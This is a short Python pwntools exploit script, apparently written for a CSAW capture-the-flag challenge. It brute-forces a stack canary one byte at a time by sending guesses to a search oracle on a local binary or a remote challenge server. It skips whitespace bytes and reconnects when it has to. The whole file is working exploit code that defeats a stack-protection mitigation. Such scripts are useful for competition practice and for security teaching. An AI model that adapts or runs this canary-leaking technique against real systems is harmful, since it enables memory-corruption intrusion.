from pwn import *
import sys

context.log_level = 'error'

SECRET = bytes([0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe])
WHITESPACE = set([0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20])

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        return process('./a.out')
    return remote('pwn.chal.csaw.io', 8000)

def query(p, data):
    p.sendline(b'1')
    p.sendline(str(len(data)).encode())
    p.send(data)
    resp = p.recvline(timeout=5)
    return b'found' in resp

def leak_canary():
    p = start()
    canary = b''
    for i in range(8):
        found = None
        for b in range(256):
            if b in WHITESPACE:
                continue
            guess = SECRET + canary + bytes([b])
            if query(p, guess):
                found = b
                break
        if found is None:
            # byte is whitespace, retry with new connection
            print(f"byte {i} is whitespace, retrying", flush=True)
            p.close()
            return None
        canary += bytes([found])
        print(f"byte {i}: {found:02x}", flush=True)
    print("canary:", canary.hex())
    p.close()
    return canary

while True:
    c = leak_canary()
    if c is not None:
        break
